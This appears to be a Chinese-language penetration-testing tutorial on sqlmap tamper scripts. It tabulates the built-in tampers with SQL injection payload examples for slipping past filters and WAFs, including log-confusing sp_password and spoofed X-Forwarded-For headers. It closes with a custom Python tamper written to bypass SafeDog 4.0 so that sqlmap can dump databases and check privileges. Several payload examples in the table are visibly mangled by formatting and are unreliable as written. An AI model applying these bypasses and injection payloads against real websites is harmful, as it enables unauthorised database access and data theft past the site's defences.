# tamper

### 一、自带tamper介绍

1、tamper的作用：\
使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击。

2、WAF是啥？

* WAF：Web应用程序防火墙，Web Application Firewall
* IPS：入侵防御系统， Intrusion Prevention System
* IDS：入侵检测系统，Intrusion Detection System

3、tamper用法

\--tamper=TAMPER 利用给定的脚本进行篡改注入数据。其用法可举例说明：

sqlmap.py -u "[http://.../?uname=admin\&pwd=pass123](http://../?uname=admin\&pwd=pass123)" --level=5 --risk=3 -p "uname" --tamper=xxx.py

表示对指定的url地址，以所设置的level等级、risk等级，并采用选定的tamper篡改脚本对参数“uname”进行检测

sqlmap中所有的tamper：

各种tamper的适用范围如下图所示：

![](<../../.gitbook/assets/image (3).png>)

各tamper的大意如下表格所示：

| tamper                       | 功能                                                                                                                                                 | 举例                                                                                                                                                                        |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | 对引号进行utf-8格式编码(%EF%BC%87)                                                                                                                          | 1 AND '1'='1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871                                                                                                                     |
| apostrophenullencode.py      | 用非法的双unicode字符(%00%27)替换引号字符                                                                                                                       | 1 AND '1'='1 ==> 1 AND %00%271%00%27=%00%271                                                                                                                              |
| appendnullbyte.py            | 在有效载荷结束位置加载零字节字符编码                                                                                                                                 | 1 AND 1=1 ==> 1 AND 1=1%00                                                                                                                                                |
| base64encode.py              | 用base64格式进行编码                                                                                                                                      | 1' AND SLEEP(5)# ==> MScgQU5EIFNMRUVQKDUpIw==                                                                                                                             |
| between.py                   | 用between替换大于号（>）                                                                                                                                   | <p>1 AND A > B --  ==> 1 AND A NOT BETWEEN 0 AND B  --</p><p>1 AND A = B --  ==> 1 AND A BETWEEN B AND B --</p>                                                           |
| bluecoat.py                  | 对SQL语句替换空格字符为(%09)，并替换"="--->"LIKE"                                                                                                                | SELECT username FROM users WHERE id = 1 ==> SELECT%09username FROM%09users WHERE%09id LIKE 1                                                                              |
| apostrophemask.py            | 用utf-8格式编码引号(如：%EF%BC%87)                                                                                                                          | 1 AND '1'='1 ==> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871                                                                                                                     |
| charunicodeencode.py         | 对字符串进行Unicode格式转义编码                                                                                                                                | SELECT FIELD%20FROM TABLE ==> %u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045  |
| charencode.py                | 采用url格式编码1次                                                                                                                                        | SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45                                                                       |
| chardoubleencode.py          | 采用url格式编码2次                                                                                                                                        | SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545                         |
| commalessmid.py              | 将payload中的逗号用 from和for代替，用于过滤了逗号并且是3个参数的情况                                                                                                         | MID(VERSION(), 1, 1) ==> MID(VERSION() FROM 1 FOR 1)                                                                                                                      |
| concat2concatws.py           | CONCAT() ==> CONCAT\_WS()，用于过滤了CONCAT()函数的情况                                                                                                       | CONCAT(1,2) ==> CONCAT\_WS(MID(CHAR(0),0,0),1,2)                                                                                                                          |
| equaltolike.py               | = ==> LIKE，用于过滤了等号"="的情况                                                                                                                           | SELECT _FROM users WHERE id=1 ==> SELECT_ FROM users WHERE id LIKE 1                                                                                                      |
| greatest.py                  |                                                                                                                                                    | 1 AND A > B ==> 1 AND GREATEST(A, B+1)=A                                                                                                                                  |
| halfversionedmorekeywords.py | 空格 ==> /\*!0 （在关键字前添加注释）                                                                                                                           | union ==> /\*!0union                                                                                                                                                      |
| ifnull2ifisnull.py           | IFNULL(A, B) ==> IF(ISNULL(A), B, A)                                                                                                               | IFNULL(1, 2) ==> IF(ISNULL(1),2,1)                                                                                                                                        |
| informationschemacomment.py  | <p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><p>retVal = re.sub(r"(?i)(information_schema).", "g&#x3C;1>/**/.", payload)</p> | select table\_name from information\_schema.tables ==> select table\_name from information\_schema/\*\*/.tables                                                           |
| lowercase.py                 | 将 payload 里的大写转为小写                                                                                                                                 | SELECT table\_name FROM INFORMATION\_SCHEMA.TABLES ==> select table\_name from information\_schema.tables                                                                 |
| modsecurityversioned.py      | 用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf                                                                                                              | 1 AND 2>1-- ==> 1 /_!30874AND 2>1_/--                                                                                                                                     |
| modsecurityzeroversioned.py  | 用注释来包围完整的查询语句，用于绕过 waf ，和上面类似                                                                                                                      | 1 and 2>1--+ ==> 1 /!00000and 2>1/--+                                                                                                                                     |
| multiplespaces.py            | 围绕SQL关键字添加多个空格                                                                                                                                     | 1 UNION SELECT foobar ==> 1 UNION SELECT foobar                                                                                                                           |
| nonrecursivereplacement.py   | 关键字双写，可用于关键字过滤                                                                                                                                     | 1 UNION SELECT 2-- ==> 1 UNIONUNION SELESELECTCT 2--                                                                                                                      |
| overlongutf8.py              | 转换给定的payload当中的所有字符                                                                                                                                | SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1                                                                     |
| percentage.py                | 用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个(%)                                                                                                                    | SELECT FIELD FROM TABLE ==> %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E                                                                                                   |
| randomcase.py                | 将 payload 随机大小写                                                                                                                                    | INSERT ==> InseRt                                                                                                                                                         |
| randomcomments.py            | 在 payload 的关键字中间随机插入注释符 /\*\*/ ，可用于绕过关键字过滤                                                                                                         | INSERT ==> I / **/ N /** / SERT                                                                                                                                           |
| securesphere.py              | 在payload后追加特殊构造的字符串                                                                                                                                | 1 AND 1=1 ==> 1 AND 1=1 and '0having'='0having'                                                                                                                           |
| space2comment.py             | 用注释符 // 代替空格，用于空格的绕过                                                                                                                               | SELECT id FROM users ==> SELECT//id//FROM//users                                                                                                                          |
| space2dash.py                | 用\[注释符(--)+一个随机字符串+一个换行符]替换控制符                                                                                                                     | union select 1,2--+ ==> union--HSHjsJh%0Aselect--HhjHSJ%0A1,2--+                                                                                                          |
| space2hash.py                | 用\[注释符(#)+一个随机字符串+一个换行符]替换控制符                                                                                                                      | union select 1,2--+ ==> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+                                                                                                        |
| space2morehash.py            | 用多个\[注释符(#)+一个随机字符串+一个换行符]替换控制符                                                                                                                    | union select 1,2--+ ==> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2--+                                                                                  |
| space2mssqlblank.py          | 用随机的空白符替换payload中的空格                                                                                                                               | SELECT id FROM users ==> SELECT%0Eid%0DFROM%07users                                                                                                                       |
| space2mssqlhash.py           | 用\[字符# +一个换行符]替换payload中的空格                                                                                                                        | union select 1,2--+ ==> union%23%0Aselect%23%0A1,2--+                                                                                                                     |
| space2plus.py                | 用加号(+)替换空格                                                                                                                                         | SELECT id FROM users ==> SELECT+id+FROM+users                                                                                                                             |
| space2randomblank.py         | 用随机的空白符替换payload中的空格                                                                                                                               | SELECT id FROM users ==> SELECT%0Did%0DFROM%0Ausers                                                                                                                       |
| sp\_password.py              | 在payload语句后添加 sp\_password ，用于迷惑数据库日志（Space ==> sp\_password）                                                                                      | 1 AND 9227=9227-- ==> 1 AND 9227=9227 -- sp\_password                                                                                                                     |
| symboliclogical.py           | 用 && 替换 and ，用 \|\| 替换 or ，用于这些关键字被过滤的情况                                                                                                           | <p>1 and 1=1 ==> 1 %26%26 1=1</p><p>1 or 1=1 ==> 1 %7c%7c 1=1</p>                                                                                                         |
| unionalltounion.py           | 用 union select 替换union all select                                                                                                                  | union all select 1,2--+ ==> union select 1,2--+                                                                                                                           |
| unmagicquotes.py             | 用宽字符绕过 GPC addslashes                                                                                                                              | 1' and 1=1 ==> 1%df%27 and 1=1--                                                                                                                                          |
| uppercase.py                 | 将payload中的小写字母转为大写格式                                                                                                                               | insert ==> INSERT                                                                                                                                                         |
| varnish.py                   | 添加一个HTTP头“ X-originating-IP ”来绕过WAF                                                                                                                | headers = kwargs.get("headers", {})headers\["X-originating-IP"] = "127.0.0.1"return payload                                                                               |
| versionedkeywords.py         | 对非函数的关键字进行注释                                                                                                                                       | 1 union select user() ==> 1/!UNION//!SELECT/user()                                                                                                                        |
| versionedmorekeywords.py     | 对每个关键字进行注释处理                                                                                                                                       | 1 union select user() ==> 1/!UNION//!SELECT/user()                                                                                                                        |
| xforwardedfor.py             | 添加一个伪造的HTTP头“ X-Forwarded-For ”来绕过WAF                                                                                                              | headers = kwargs.get("headers", {})headers\["X-Forwarded-For"] = randomIP()return payload                                                                                 |

### 二、绕狗4.0tamper

可过的版本：

主程序版本号：V4.0.26550\
网马库版本：2019-02-14\
官方防护规则版本：2019-2-14

tamper编写注意事项：

因为 sqlmap 的测试时对 UNION 查询注入测试时必须确定当前表的列数，也就是利用 ORDER BY 来确定。如果ORDER BY 语句不成功则直接跳过 UNION 查询注入阶段。所以如果使用 UNION 查询注入 tamper 必须对 ORDER BY 进行绕过。&#x20;

未绕过 ORDER BY 直接跳过 UNION 查询：

![](<../../.gitbook/assets/image (35).png>)

```
可 dump 数据的 tamper
#!/usr/bin/env python
# SafeDog 4.0.26550
#

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass


def tamper(payload, **kwargs):
    sign = '/*!51234a*/'
    retVal = payload
    l = ['UNION', 'ORDER','SELECT','super_priv'] # SELECT super_priv 为了sqlmap执行 "--is-dba"
    data = {}
    for i in l:
        data[i] = i + sign
    for i in data.keys():
        retVal = retVal.replace(i, data[i])

    retVal = retVal.replace("CURRENT_USER()", "CURRENT_USER" + sign + "()") # 为了sqlmap执行 "--current-user"
    retVal = retVal.replace("AND ","AND%23%0a ") # 为了sqlmap执行 "--dump"
    return retVal

```

测试效果：

![](<../../.gitbook/assets/image (30).png>)
